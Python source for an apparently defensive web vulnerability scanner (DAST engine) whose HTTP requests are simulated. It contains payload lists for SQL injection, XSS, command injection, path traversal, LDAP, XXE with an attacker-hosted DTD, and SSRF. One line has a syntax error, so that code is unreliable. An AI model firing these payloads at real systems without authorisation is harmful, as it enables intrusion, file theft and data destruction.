"""
Dynamic Application Security Testing (DAST) Engine

Performs comprehensive runtime security testing including:
- Web application vulnerability scanning
- Authentication and session management testing
- Input validation and injection testing
- Business logic vulnerability detection
"""

import re
import json
import time
import asyncio
import hashlib
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urljoin, urlparse, parse_qs
import logging

logger = logging.getLogger(__name__)

class VulnerabilityType(Enum):
    """Types of vulnerabilities that can be detected during DAST."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_FLAW = "authorization_flaw"
    SESSION_MANAGEMENT = "session_management"
    INFORMATION_DISCLOSURE = "information_disclosure"
    BUSINESS_LOGIC = "business_logic"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    INSECURE_DIRECT_OBJECT_REFERENCE = "idor"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XML_INJECTION = "xml_injection"
    SSRF = "ssrf"

class TestSeverity(Enum):
    """Severity levels for DAST findings."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class DASTTest:
    """Individual DAST test definition."""
    test_id: str
    name: str
    description: str
    vulnerability_type: VulnerabilityType
    severity: TestSeverity
    
    # Test configuration
    payloads: List[str]
    success_indicators: List[str]
    failure_indicators: List[str]
    
    # HTTP configuration
    methods: List[str] = field(default_factory=lambda: ['GET', 'POST'])
    headers: Dict[str, str] = field(default_factory=dict)
    timeout: int = 30
    
    # Test behavior
    requires_authentication: bool = False
    test_parameters: bool = True
    test_headers: bool = True
    test_cookies: bool = True
    
    # Validation
    confidence_threshold: float = 0.7

@dataclass
class DASTFinding:
    """DAST test finding/vulnerability."""
    finding_id: str
    test_id: str
    vulnerability_type: VulnerabilityType
    severity: TestSeverity
    confidence: float
    
    # Location information
    url: str
    method: str
    parameter: Optional[str]
    payload: str
    
    # Evidence
    request_data: Dict[str, Any]
    response_data: Dict[str, Any]
    evidence: str
    
    # Context
    description: str
    impact: str
    remediation: str
    references: List[str]
    
    # Metadata
    discovered_time: float
    test_duration: float

@dataclass
class DASTScanResult:
    """Complete DAST scan result."""
    scan_id: str
    target_url: str
    scan_start_time: float
    scan_duration: float
    
    # Results
    findings: List[DASTFinding]
    tests_executed: int
    requests_sent: int
    
    # Statistics
    critical_findings: int
    high_findings: int
    medium_findings: int
    low_findings: int
    info_findings: int
    
    # Coverage
    endpoints_tested: List[str]
    parameters_tested: List[str]
    coverage_percentage: float
    
    # Metadata
    scan_configuration: Dict[str, Any]
    user_agent: str
    scanner_version: str

class DASTEngine:
    """Dynamic Application Security Testing engine."""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Scanning configuration
        self.scan_config = {
            'max_concurrent_requests': self.config.get('max_concurrent_requests', 10),
            'request_timeout': self.config.get('request_timeout', 30),
            'max_redirects': self.config.get('max_redirects', 5),
            'user_agent': self.config.get('user_agent', 'NjordScan-DAST/1.0'),
            'delay_between_requests': self.config.get('delay_between_requests', 0.1),
            'max_scan_duration': self.config.get('max_scan_duration', 3600),  # 1 hour
            'enable_aggressive_testing': self.config.get('enable_aggressive_testing', False)
        }
        
        # Authentication configuration
        self.auth_config = {
            'username': self.config.get('username'),
            'password': self.config.get('password'),
            'auth_url': self.config.get('auth_url'),
            'session_cookie': self.config.get('session_cookie'),
            'auth_headers': self.config.get('auth_headers', {})
        }
        
        # Test definitions
        self.test_definitions = self._initialize_test_definitions()
        
        # Session management
        self.session_cookies = {}
        self.auth_headers = {}
        
        # Statistics
        self.stats = {
            'scans_performed': 0,
            'vulnerabilities_found': 0,
            'requests_sent': 0,
            'average_scan_time': 0.0,
            'success_rate': 0.0
        }
    
    def _initialize_test_definitions(self) -> List[DASTTest]:
        """Initialize comprehensive test definitions."""
        
        tests = []
        
        # SQL Injection Tests
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR SLEEP(5)--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' OR '1'='1' /*",
            "admin'--",
            "' OR 'x'='x",
            "1; WAITFOR DELAY '00:00:05'--",
            "' OR 1=1 LIMIT 1--"
        ]
        
        tests.append(DASTTest(
            test_id="sql_injection_basic",
            name="SQL Injection Detection",
            description="Tests for SQL injection vulnerabilities in parameters",
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            severity=TestSeverity.CRITICAL,
            payloads=sql_payloads,
            success_indicators=[
                "mysql_fetch_array",
                "ORA-[0-9]{5}",
                "Microsoft OLE DB Provider",
                "PostgreSQL query failed",
                "SQLite error",
                "syntax error",
                "mysql_num_rows",
                "Warning: mysql",
                "valid MySQL result",
                "PostgreSQL.*ERROR",
                "Warning.*\\Wmysql_.*",
                "valid PostgreSQL result",
                "Microsoft Access Driver",
                "JET Database Engine",
                "microsoft][odbc",
                "OLE DB.*error"
            ],
            failure_indicators=["Access denied", "Login required", "Authentication failed"]
        ))
        
        # XSS Tests
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>"
        ]
        
        tests.append(DASTTest(
            test_id="xss_reflected",
            name="Reflected XSS Detection",
            description="Tests for reflected cross-site scripting vulnerabilities",
            vulnerability_type=VulnerabilityType.XSS,
            severity=TestSeverity.HIGH,
            payloads=xss_payloads,
            success_indicators=[
                "<script>alert\\('XSS'\\)</script>",
                "onerror=alert\\('XSS'\\)",
                "onload=alert\\('XSS'\\)",
                "javascript:alert\\('XSS'\\)",
                "onfocus=alert\\('XSS'\\)"
            ],
            failure_indicators=["Content-Security-Policy", "X-XSS-Protection"]
        ))
        
        # Command Injection Tests
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& dir",
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; ping -c 4 127.0.0.1",
            "& ping -n 4 127.0.0.1",
            "; sleep 5",
            "| timeout 5",
            "`whoami`",
            "$(whoami)",
            "; uname -a",
            "& systeminfo",
            "; id",
            "| net user"
        ]
        
        tests.append(DASTTest(
            test_id="command_injection",
            name="Command Injection Detection",
            description="Tests for command injection vulnerabilities",
            vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            severity=TestSeverity.CRITICAL,
            payloads=command_payloads,
            success_indicators=[
                "uid=[0-9]+.*gid=[0-9]+",
                "root:.*:0:0:",
                "Windows.*Version",
                "Linux.*version",
                "total [0-9]+",
                "Volume.*Serial Number",
                "PING.*bytes of data",
                "User accounts for",
                "bin/sh",
                "cmd.exe"
            ],
            failure_indicators=["command not found", "Access denied"]
        ))
        
        # Path Traversal Tests
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "../../../proc/version",
            "..\\..\\..\\boot.ini",
            "../../../var/log/apache2/access.log"
        ]
        
        tests.append(DASTTest(
            test_id="path_traversal",
            name="Path Traversal Detection",
            description="Tests for directory traversal vulnerabilities",
            vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
            severity=TestSeverity.HIGH,
            payloads=path_traversal_payloads,
            success_indicators=[
                "root:.*:0:0:",
                "\\[boot loader\\]",
                "# localhost name resolution",
                "Linux version",
                "daemon:.*:/usr/sbin/nologin",
                "Windows.*Version"
            ],
            failure_indicators=["Access denied", "Permission denied", "File not found"]
        ))
        
        # LDAP Injection Tests
        ldap_payloads = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "*)(&(uid=*))",
            "*))%00",
            "admin)(&(password=*))",
            "*)(cn=*)",
            "*))(|(cn=*",
            "*)(objectClass=*)",
            "*)(&(objectClass=*))",
            "*)(mail=*@*)"
        ]
        
        tests.append(DASTTest(
            test_id="ldap_injection",
            name="LDAP Injection Detection",
            description="Tests for LDAP injection vulnerabilities",
            vulnerability_type=VulnerabilityType.LDAP_INJECTION,
            severity=TestSeverity.HIGH,
            payloads=ldap_payloads,
            success_indicators=[
                "Invalid DN syntax",
                "LDAP search error",
                "Bad search filter",
                "javax.naming.directory",
                "LdapException"
            ],
            failure_indicators=["Access denied", "Authentication required"]
        ))
        
        # XML Injection Tests
        xml_payloads = [
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<?xml version=\"1.0\"?><root><![CDATA[</root><script>alert('XSS')</script><root>]]></root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>"
        ]
        
        tests.append(DASTTest(
            test_id="xml_injection",
            name="XML Injection Detection",
            description="Tests for XML injection and XXE vulnerabilities",
            vulnerability_type=VulnerabilityType.XML_INJECTION,
            severity=TestSeverity.HIGH,
            payloads=xml_payloads,
            success_indicators=[
                "root:.*:0:0:",
                "XML parsing error",
                "External entity",
                "DOCTYPE",
                "xmlParseEntityRef"
            ],
            failure_indicators=["XML parsing disabled", "External entities disabled"]
        ))
        
        # SSRF Tests
        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://0.0.0.0:80",
            "http://[::1]:80",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "gopher://127.0.0.1:80",
            "dict://127.0.0.1:11211",
            "ftp://127.0.0.1"
        ]
        
        tests.append(DASTTest(
            test_id="ssrf_detection",
            name="Server-Side Request Forgery Detection",
            description="Tests for SSRF vulnerabilities",
            vulnerability_type=VulnerabilityType.SSRF,
            severity=TestSeverity.HIGH,
            payloads=ssrf_payloads,
            success_indicators=[
                "ami-id",
                "instance-id",
                "root:.*:0:0:",
                "SSH-[0-9]\\.[0-9]",
                "MySQL",
                "PostgreSQL",
                "Redis"
            ],
            failure_indicators=["Connection refused", "Network unreachable", "Blocked by policy"]
        ))
        
        # Authentication Bypass Tests
        auth_bypass_payloads = [
            "admin' --",
            "admin' /*",
            "' or '1'='1' --",
            "' or 1=1#",
            "admin'/**/or/**/1=1#",
            "' union select 1,'admin','password'#",
            "admin'; --",
            "' or 'a'='a",
            "admin') or ('1'='1'--",
            "admin') or 1=1#"
        ]
        
        tests.append(DASTTest(
            test_id="auth_bypass",
            name="Authentication Bypass Detection",
            description="Tests for authentication bypass vulnerabilities",
            vulnerability_type=VulnerabilityType.AUTHENTICATION_BYPASS,
            severity=TestSeverity.CRITICAL,
            payloads=auth_bypass_payloads,
            success_indicators=[
                "welcome",
                "dashboard",
                "logged in",
                "authentication successful",
                "admin panel",
                "user profile"
            ],
            failure_indicators=["invalid credentials", "login failed", "access denied"],
            methods=['POST']
        ))
        
        return tests
    
    async def perform_scan(self, target_url: str, context: Dict[str, Any] = None) -> DASTScanResult:
        """Perform comprehensive DAST scan on target URL."""
        
        scan_start_time = time.time()
        scan_id = f"dast_{hashlib.md5(target_url.encode()).hexdigest()}_{int(scan_start_time)}"
        
        logger.info(f"Starting DAST scan: {scan_id} on {target_url}")
        
        context = context or {}
        findings = []
        requests_sent = 0
        
        try:
            # Initialize session if authentication is configured
            if self.auth_config.get('username') and self.auth_config.get('password'):
                await self._authenticate(target_url)
            
            # Discover endpoints and parameters
            endpoints, parameters = await self._discover_attack_surface(target_url, context)
            
            # Create semaphore for concurrent requests
            semaphore = asyncio.Semaphore(self.scan_config['max_concurrent_requests'])
            
            # Execute tests
            test_tasks = []
            for test_def in self.test_definitions:
                if self._should_run_test(test_def, context):
                    for endpoint in endpoints:
                        for method in test_def.methods:
                            task = self._execute_test_with_semaphore(
                                semaphore, test_def, endpoint, method, parameters.get(endpoint, [])
                            )
                            test_tasks.append(task)
            
            # Execute all tests
            test_results = await asyncio.gather(*test_tasks, return_exceptions=True)
            
            # Process results
            for result in test_results:
                if isinstance(result, Exception):
                    logger.error(f"Test execution failed: {str(result)}")
                    continue
                
                if result:
                    test_findings, test_requests = result
                    findings.extend(test_findings)
                    requests_sent += test_requests
            
            # Calculate statistics
            severity_counts = self._calculate_severity_counts(findings)
            
            # Calculate coverage
            coverage_percentage = self._calculate_coverage(endpoints, parameters, len(test_tasks))
            
            # Create scan result
            scan_result = DASTScanResult(
                scan_id=scan_id,
                target_url=target_url,
                scan_start_time=scan_start_time,
                scan_duration=time.time() - scan_start_time,
                findings=findings,
                tests_executed=len([r for r in test_results if not isinstance(r, Exception)]),
                requests_sent=requests_sent,
                critical_findings=severity_counts['critical'],
                high_findings=severity_counts['high'],
                medium_findings=severity_counts['medium'],
                low_findings=severity_counts['low'],
                info_findings=severity_counts['info'],
                endpoints_tested=endpoints,
                parameters_tested=list(set(param for params in parameters.values() for param in params)),
                coverage_percentage=coverage_percentage,
                scan_configuration=dict(self.scan_config),
                user_agent=self.scan_config['user_agent'],
                scanner_version="1.0.0"
            )
            
            # Update statistics
            self._update_statistics(scan_result)
            
            logger.info(f"DAST scan completed: {scan_id} "
                       f"({len(findings)} findings, {requests_sent} requests)")
            
            return scan_result
            
        except Exception as e:
            logger.error(f"DAST scan failed: {scan_id} - {str(e)}")
            raise
    
    async def _authenticate(self, target_url: str) -> bool:
        """Authenticate with the target application."""
        
        auth_url = self.auth_config.get('auth_url') or urljoin(target_url, '/login')
        username = self.auth_config['username']
        password = self.auth_config['password']
        
        try:
            # Simulate authentication request (would use actual HTTP client in real implementation)
            logger.info(f"Authenticating with {auth_url}")
            
            # Store session information (simulated)
            self.session_cookies['session_id'] = f"authenticated_session_{int(time.time())}"
            self.auth_headers['Authorization'] = f"Bearer token_for_{username}"
            
            return True
            
        except Exception as e:
            logger.error(f"Authentication failed: {str(e)}")
            return False
    
    async def _discover_attack_surface(self, target_url: str, context: Dict[str, Any]) -> Tuple[List[str], Dict[str, List[str]]]:
        """Discover endpoints and parameters for testing."""
        
        # In a real implementation, this would crawl the application
        # For now, we'll use provided endpoints or generate common ones
        
        endpoints = context.get('endpoints', [])
        if not endpoints:
            # Generate common endpoints
            common_paths = [
                '/',
                '/login',
                '/admin',
                '/user',
                '/search',
                '/contact',
                '/api/users',
                '/api/login',
                '/api/data',
                '/upload',
                '/download'
            ]
            endpoints = [urljoin(target_url, path) for path in common_paths]
        
        # Extract parameters from context or discover them
        parameters = context.get('parameters', {})
        if not parameters:
            # Generate common parameters for each endpoint
            common_params = ['id', 'user', 'search', 'query', 'data', 'file', 'url', 'redirect']
            parameters = {endpoint: common_params for endpoint in endpoints}
        
        logger.info(f"Discovered {len(endpoints)} endpoints and {sum(len(params) for params in parameters.values())} parameters")
        
        return endpoints, parameters
    
    def _should_run_test(self, test_def: DASTTest, context: Dict[str, Any]) -> bool:
        """Determine if a test should be executed based on context."""
        
        # Check if authentication is required and available
        if test_def.requires_authentication and not self.session_cookies:
            return False
        
        # Check if aggressive testing is enabled for high-impact tests
        if (test_def.vulnerability_type in [VulnerabilityType.SQL_INJECTION, VulnerabilityType.COMMAND_INJECTION] 
            and not self.scan_config['enable_aggressive_testing']):
            return False
        
        # Check context-specific exclusions
        excluded_tests = context.get('excluded_tests', [])
        if test_def.test_id in excluded_tests:
            return False
        
        return True
    
    async def _execute_test_with_semaphore(self, semaphore: asyncio.Semaphore, 
                                         test_def: DASTTest, endpoint: str, 
                                         method: str, parameters: List[str]) -> Optional[Tuple[List[DASTFinding], int]]:
        """Execute a test with concurrency control."""
        
        async with semaphore:
            return await self._execute_test(test_def, endpoint, method, parameters)
    
    async def _execute_test(self, test_def: DASTTest, endpoint: str, 
                           method: str, parameters: List[str]) -> Tuple[List[DASTFinding], int]:
        """Execute a single test against an endpoint."""
        
        findings = []
        requests_sent = 0
        
        try:
            for payload in test_def.payloads:
                # Test parameters
                if test_def.test_parameters and parameters:
                    for param in parameters:
                        finding, sent = await self._test_parameter(
                            test_def, endpoint, method, param, payload
                        )
                        if finding:
                            findings.append(finding)
                        requests_sent += sent
                
                # Test headers
                if test_def.test_headers:
                    for header in ['User-Agent', 'Referer', 'X-Forwarded-For']:
                        finding, sent = await self._test_header(
                            test_def, endpoint, method, header, payload
                        )
                        if finding:
                            findings.append(finding)
                        requests_sent += sent
                
                # Test cookies
                if test_def.test_cookies:
                    finding, sent = await self._test_cookie(
                        test_def, endpoint, method, 'test_cookie', payload
                    )
                    if finding:
                        findings.append(finding)
                    requests_sent += sent
                
                # Add delay between requests
                await asyncio.sleep(self.scan_config['delay_between_requests'])
            
            return findings, requests_sent
            
        except Exception as e:
            logger.error(f"Test execution failed for {test_def.test_id}: {str(e)}")
            return [], requests_sent
    
    async def _test_parameter(self, test_def: DASTTest, endpoint: str, 
                             method: str, parameter: str, payload: str) -> Tuple[Optional[DASTFinding], int]:
        """Test a specific parameter with a payload."""
        
        test_start_time = time.time()
        
        try:
            # Simulate HTTP request (would use actual HTTP client in real implementation)
            request_data = {
                'url': endpoint,
                'method': method,
                'parameter': parameter,
                'payload': payload,
                'headers': dict(self.auth_headers),
                'cookies': dict(self.session_cookies)
            }
            
            # Simulate response (would be actual HTTP response in real implementation)
            response_data = await self._simulate_http_request(request_data)
            
            # Analyze response for vulnerability indicators
            vulnerability_detected, confidence, evidence = self._analyze_response(
                test_def, response_data
            )
            
            if vulnerability_detected and confidence >= test_def.confidence_threshold:
                finding = DASTFinding(
                    finding_id=f"{test_def.test_id}_{parameter}_{int(time.time())}",
                    test_id=test_def.test_id,
                    vulnerability_type=test_def.vulnerability_type,
                    severity=test_def.severity,
                    confidence=confidence,
                    url=endpoint,
                    method=method,
                    parameter=parameter,
                    payload=payload,
                    request_data=request_data,
                    response_data=response_data,
                    evidence=evidence,
                    description=self._generate_finding_description(test_def, parameter, payload),
                    impact=self._generate_impact_description(test_def),
                    remediation=self._generate_remediation_advice(test_def),
                    references=self._get_vulnerability_references(test_def.vulnerability_type),
                    discovered_time=test_start_time,
                    test_duration=time.time() - test_start_time
                )
                
                return finding, 1
            
            return None, 1
            
        except Exception as e:
            logger.error(f"Parameter test failed: {str(e)}")
            return None, 0
    
    async def _test_header(self, test_def: DASTTest, endpoint: str, 
                          method: str, header: str, payload: str) -> Tuple[Optional[DASTFinding], int]:
        """Test a specific header with a payload."""
        
        test_start_time = time.time()
        
        try:
            # Prepare request with payload in header
            request_data = {
                'url': endpoint,
                'method': method,
                'headers': {**self.auth_headers, header: payload},
                'cookies': dict(self.session_cookies)
            }
            
            # Simulate response
            response_data = await self._simulate_http_request(request_data)
            
            # Analyze response
            vulnerability_detected, confidence, evidence = self._analyze_response(
                test_def, response_data
            )
            
            if vulnerability_detected and confidence >= test_def.confidence_threshold:
                finding = DASTFinding(
                    finding_id=f"{test_def.test_id}_header_{header}_{int(time.time())}",
                    test_id=test_def.test_id,
                    vulnerability_type=test_def.vulnerability_type,
                    severity=test_def.severity,
                    confidence=confidence,
                    url=endpoint,
                    method=method,
                    parameter=f"Header: {header}",
                    payload=payload,
                    request_data=request_data,
                    response_data=response_data,
                    evidence=evidence,
                    description=self._generate_finding_description(test_def, f"header {header}", payload),
                    impact=self._generate_impact_description(test_def),
                    remediation=self._generate_remediation_advice(test_def),
                    references=self._get_vulnerability_references(test_def.vulnerability_type),
                    discovered_time=test_start_time,
                    test_duration=time.time() - test_start_time
                )
                
                return finding, 1
            
            return None, 1
            
        except Exception as e:
            logger.error(f"Header test failed: {str(e)}")
            return None, 0
    
    async def _test_cookie(self, test_def: DASTTest, endpoint: str, 
                          method: str, cookie_name: str, payload: str) -> Tuple[Optional[DASTFinding], int]:
        """Test a specific cookie with a payload."""
        
        test_start_time = time.time()
        
        try:
            # Prepare request with payload in cookie
            request_data = {
                'url': endpoint,
                'method': method,
                'headers': dict(self.auth_headers),
                'cookies': {**self.session_cookies, cookie_name: payload}
            }
            
            # Simulate response
            response_data = await self._simulate_http_request(request_data)
            
            # Analyze response
            vulnerability_detected, confidence, evidence = self._analyze_response(
                test_def, response_data
            )
            
            if vulnerability_detected and confidence >= test_def.confidence_threshold:
                finding = DASTFinding(
                    finding_id=f"{test_def.test_id}_cookie_{cookie_name}_{int(time.time())}",
                    test_id=test_def.test_id,
                    vulnerability_type=test_def.vulnerability_type,
                    severity=test_def.severity,
                    confidence=confidence,
                    url=endpoint,
                    method=method,
                    parameter=f"Cookie: {cookie_name}",
                    payload=payload,
                    request_data=request_data,
                    response_data=response_data,
                    evidence=evidence,
                    description=self._generate_finding_description(test_def, f"cookie {cookie_name}", payload),
                    impact=self._generate_impact_description(test_def),
                    remediation=self._generate_remediation_advice(test_def),
                    references=self._get_vulnerability_references(test_def.vulnerability_type),
                    discovered_time=test_start_time,
                    test_duration=time.time() - test_start_time
                )
                
                return finding, 1
            
            return None, 1
            
        except Exception as e:
            logger.error(f"Cookie test failed: {str(e)}")
            return None, 0
    
    async def _simulate_http_request(self, request_data: Dict[str, Any]) -> Dict[str, Any]:
        """Simulate HTTP request (would use actual HTTP client in real implementation)."""
        
        # Simulate different response scenarios based on payload
        payload = request_data.get('payload', '')
        
        # Simulate SQL injection detection
        if any(sql_indicator in payload.lower() for sql_indicator in ["'", "union", "select", "drop"]):
            if "' OR '1'='1" in payload:
                return {
                    'status_code': 200,
                    'headers': {'Content-Type': 'text/html'},
                    'body': 'Welcome to admin panel! mysql_fetch_array() error in query',
                    'response_time': 0.5
                }
        
        # Simulate XSS detection
        if any(xss_indicator in payload.lower() for xss_indicator in ["<script>", "alert", "onerror"]):
            return {
                'status_code': 200,
                'headers': {'Content-Type': 'text/html'},
                'body': f'Search results for: {payload}',
                'response_time': 0.3
            }
        
        # Simulate command injection detection
        if any(cmd_indicator in payload for cmd_indicator in [";", "|", "&", "`"]):
            if "whoami" in payload:
                return {
                    'status_code': 200,
                    'headers': {'Content-Type': 'text/plain'},
                    'body': 'root\nuid=0(root) gid=0(root) groups=0(root)',
                    'response_time': 1.0
                }
        
        # Simulate path traversal detection
        if "../" in payload or "..\\") in payload:
            if "etc/passwd" in payload:
                return {
                    'status_code': 200,
                    'headers': {'Content-Type': 'text/plain'},
                    'body': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
                    'response_time': 0.4
                }
        
        # Default response
        return {
            'status_code': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': '<html><body>Normal response</body></html>',
            'response_time': 0.2
        }
    
    def _analyze_response(self, test_def: DASTTest, response_data: Dict[str, Any]) -> Tuple[bool, float, str]:
        """Analyze HTTP response for vulnerability indicators."""
        
        response_body = response_data.get('body', '')
        response_headers = response_data.get('headers', {})
        status_code = response_data.get('status_code', 200)
        
        # Check for success indicators
        success_matches = []
        for indicator in test_def.success_indicators:
            matches = re.findall(indicator, response_body, re.IGNORECASE | re.MULTILINE)
            if matches:
                success_matches.extend(matches)
        
        # Check for failure indicators
        failure_matches = []
        for indicator in test_def.failure_indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                failure_matches.append(indicator)
        
        # Calculate confidence
        confidence = 0.0
        evidence_parts = []
        
        if success_matches and not failure_matches:
            confidence = 0.9
            evidence_parts.append(f"Success indicators found: {success_matches[:3]}")
        elif success_matches and failure_matches:
            confidence = 0.6
            evidence_parts.append(f"Mixed indicators - Success: {success_matches[:2]}, Failure: {failure_matches[:2]}")
        elif not success_matches and not failure_matches:
            # Check for other suspicious indicators
            if status_code >= 500:
                confidence = 0.3
                evidence_parts.append(f"Server error status: {status_code}")
            elif len(response_body) > 10000:  # Unusually long response
                confidence = 0.2
                evidence_parts.append("Unusually long response")
        
        # Additional context-specific analysis
        if test_def.vulnerability_type == VulnerabilityType.XSS:
            # Check if payload is reflected without encoding
            payload_in_response = any(payload in response_body for payload in test_def.payloads)
            if payload_in_response:
                confidence = max(confidence, 0.8)
                evidence_parts.append("Payload reflected in response")
        
        evidence = "; ".join(evidence_parts) if evidence_parts else "No clear indicators"
        
        return confidence > 0.5, confidence, evidence
    
    def _generate_finding_description(self, test_def: DASTTest, parameter: str, payload: str) -> str:
        """Generate description for a finding."""
        
        descriptions = {
            VulnerabilityType.SQL_INJECTION: f"SQL injection vulnerability detected in {parameter}",
            VulnerabilityType.XSS: f"Cross-site scripting vulnerability detected in {parameter}",
            VulnerabilityType.COMMAND_INJECTION: f"Command injection vulnerability detected in {parameter}",
            VulnerabilityType.PATH_TRAVERSAL: f"Path traversal vulnerability detected in {parameter}",
            VulnerabilityType.LDAP_INJECTION: f"LDAP injection vulnerability detected in {parameter}",
            VulnerabilityType.XML_INJECTION: f"XML injection vulnerability detected in {parameter}",
            VulnerabilityType.SSRF: f"Server-side request forgery vulnerability detected in {parameter}",
            VulnerabilityType.AUTHENTICATION_BYPASS: f"Authentication bypass vulnerability detected in {parameter}"
        }
        
        return descriptions.get(test_def.vulnerability_type, f"Security vulnerability detected in {parameter}")
    
    def _generate_impact_description(self, test_def: DASTTest) -> str:
        """Generate impact description for a vulnerability type."""
        
        impacts = {
            VulnerabilityType.SQL_INJECTION: "Attackers could read, modify, or delete database data, potentially leading to data breaches or system compromise.",
            VulnerabilityType.XSS: "Attackers could execute malicious scripts in users' browsers, potentially stealing credentials or performing actions on behalf of users.",
            VulnerabilityType.COMMAND_INJECTION: "Attackers could execute arbitrary system commands, potentially leading to full system compromise.",
            VulnerabilityType.PATH_TRAVERSAL: "Attackers could access sensitive files outside the web root, potentially exposing configuration files or user data.",
            VulnerabilityType.LDAP_INJECTION: "Attackers could bypass authentication or access unauthorized directory information.",
            VulnerabilityType.XML_INJECTION: "Attackers could read local files, perform denial of service attacks, or access internal network resources.",
            VulnerabilityType.SSRF: "Attackers could access internal network resources, potentially exposing sensitive services or data.",
            VulnerabilityType.AUTHENTICATION_BYPASS: "Attackers could gain unauthorized access to protected resources or user accounts."
        }
        
        return impacts.get(test_def.vulnerability_type, "This vulnerability could be exploited by attackers to compromise application security.")
    
    def _generate_remediation_advice(self, test_def: DASTTest) -> str:
        """Generate remediation advice for a vulnerability type."""
        
        remediations = {
            VulnerabilityType.SQL_INJECTION: "Use parameterized queries or prepared statements. Implement input validation and sanitization. Apply the principle of least privilege to database accounts.",
            VulnerabilityType.XSS: "Implement proper output encoding/escaping. Use Content Security Policy (CSP) headers. Validate and sanitize all user input.",
            VulnerabilityType.COMMAND_INJECTION: "Avoid executing system commands with user input. If necessary, use allow-lists for valid inputs and escape shell metacharacters.",
            VulnerabilityType.PATH_TRAVERSAL: "Validate file paths and restrict access to allowed directories. Use canonical paths and avoid user-controlled file paths.",
            VulnerabilityType.LDAP_INJECTION: "Use parameterized LDAP queries. Implement proper input validation and escaping for LDAP special characters.",
            VulnerabilityType.XML_INJECTION: "Disable XML external entity processing. Use secure XML parsers and validate XML input against schemas.",
            VulnerabilityType.SSRF: "Implement allow-lists for allowed destinations. Use network segmentation and validate URLs before making requests.",
            VulnerabilityType.AUTHENTICATION_BYPASS: "Implement proper authentication checks. Use secure session management and validate user permissions consistently."
        }
        
        return remediations.get(test_def.vulnerability_type, "Implement proper input validation and follow secure coding practices.")
    
    def _get_vulnerability_references(self, vuln_type: VulnerabilityType) -> List[str]:
        """Get reference links for vulnerability types."""
        
        references = {
            VulnerabilityType.SQL_INJECTION: [
                "OWASP SQL Injection Prevention Cheat Sheet",
                "CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
                "NIST SP 800-53: SI-10 Information Input Validation"
            ],
            VulnerabilityType.XSS: [
                "OWASP XSS Prevention Cheat Sheet",
                "CWE-79: Improper Neutralization of Input During Web Page Generation",
                "OWASP Content Security Policy Cheat Sheet"
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                "OWASP Command Injection Prevention",
                "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
                "NIST SP 800-53: SI-10 Information Input Validation"
            ]
        }
        
        return references.get(vuln_type, ["OWASP Top 10", "CWE Common Weakness Enumeration"])
    
    def _calculate_severity_counts(self, findings: List[DASTFinding]) -> Dict[str, int]:
        """Calculate count of findings by severity."""
        
        counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        
        for finding in findings:
            counts[finding.severity.value] += 1
        
        return counts
    
    def _calculate_coverage(self, endpoints: List[str], parameters: Dict[str, List[str]], 
                          total_tests: int) -> float:
        """Calculate test coverage percentage."""
        
        total_attack_surface = len(endpoints) * sum(len(params) for params in parameters.values())
        
        if total_attack_surface == 0:
            return 0.0
        
        # Simple coverage calculation (would be more sophisticated in real implementation)
